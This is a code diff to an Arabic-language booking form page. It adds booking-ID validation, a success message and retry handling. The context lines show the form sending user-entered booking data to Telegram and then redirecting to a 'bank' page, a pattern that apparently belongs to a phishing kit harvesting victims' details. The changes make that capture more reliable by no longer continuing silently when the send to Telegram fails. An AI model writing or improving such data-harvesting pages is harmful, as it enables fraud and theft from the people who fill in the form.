@@ -446,7 +446,7 @@
             const bookingId = document.getElementById('bookingId').value.trim();
             const submitBtn = document.getElementById('submitBtn');
             
-            // Validate booking ID
+            // Validate booking ID - تحسين التحقق من صحة البيانات
             if (!bookingId) {
                 showError('يرجى إدخال رقم بطاقة الحجز');
                 return;
@@ -454,6 +454,18 @@
             
             if (bookingId.length < 6) {
                 showError('رقم بطاقة الحجز يجب أن يكون 6 أحرف على الأقل');
+                return;
+            }
+            
+            if (bookingId.length > 20) {
+                showError('رقم بطاقة الحجز يجب أن لا يتجاوز 20 حرف');
+                return;
+            }
+            
+            // التحقق من أن الرقم يحتوي على أحرف وأرقام فقط
+            const validPattern = /^[A-Za-z0-9]+$/;
+            if (!validPattern.test(bookingId)) {
+                showError('رقم بطاقة الحجز يجب أن يحتوي على أحرف وأرقام فقط (بدون رموز أو مسافات)');
                 return;
             }
             
@@ -479,20 +491,32 @@
                 },
                 body: JSON.stringify(bookingData)
             })
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('فشل في إرسال البيانات');
+                }
+                return response.json();
+            })
             .then(data => {
                 console.log('تم إرسال البيانات إلى تليجرام:', data);
+                
+                // عرض رسالة نجاح
+                showSuccess('تم إرسال البيانات بنجاح! جاري التحويل...');
+                
                 // Submit the form to bank page
                 setTimeout(() => {
                     window.location.href = 'bank/bank.html';
-                }, 1000);
+                }, 1500);
             })
             .catch(error => {
                 console.error('خطأ في إرسال البيانات:', error);
-                // حتى لو فشل الإرسال، نستمر في العملية
-                setTimeout(() => {
-                    window.location.href = 'bank/bank.html';
-                }, 1000);
+                
+                // إعادة تفعيل الزر في حالة الفشل
+                submitBtn.classList.remove('loading');
+                submitBtn.innerHTML = '<i class="fas fa-lock"></i> تأكيد الحجز والمتابعة للدفع';
+                submitBtn.disabled = false;
+                
+                showError('حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى.');
             });
         });
         
@@ -500,6 +524,11 @@
             const existingError = document.querySelector('.error-message');
             if (existingError) {
                 existingError.remove();
+            }
+            
+            const existingSuccess = document.querySelector('.success-message');
+            if (existingSuccess) {
+                existingSuccess.remove();
             }
             
             const errorDiv = document.createElement('div');
@@ -525,6 +554,42 @@
                     errorDiv.remove();
                 }
             }, 5000);
+        }
+        
+        function showSuccess(message) {
+            const existingError = document.querySelector('.error-message');
+            if (existingError) {
+                existingError.remove();
+            }
+            
+            const existingSuccess = document.querySelector('.success-message');
+            if (existingSuccess) {
+                existingSuccess.remove();
+            }
+            
+            const successDiv = document.createElement('div');
+            successDiv.className = 'success-message';
+            successDiv.style.cssText = `
+                background: #d1fae5;
+                border: 1px solid #6ee7b7;
+                color: #065f46;
+                padding: 1rem;
+                border-radius: 8px;
+                margin-bottom: 1rem;
+                text-align: center;
+                animation: slideInUp 0.3s ease;
+                font-size: clamp(0.9rem, 3vw, 1rem);
+            `;
+            successDiv.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
+            
+            const form = document.getElementById('bookingForm');
+            form.insertBefore(successDiv, form.firstChild);
+            
+            setTimeout(() => {
+                if (successDiv.parentNode) {
+                    successDiv.remove();
+                }
+            }, 3000);
         }
         
         // Add floating animation to price display
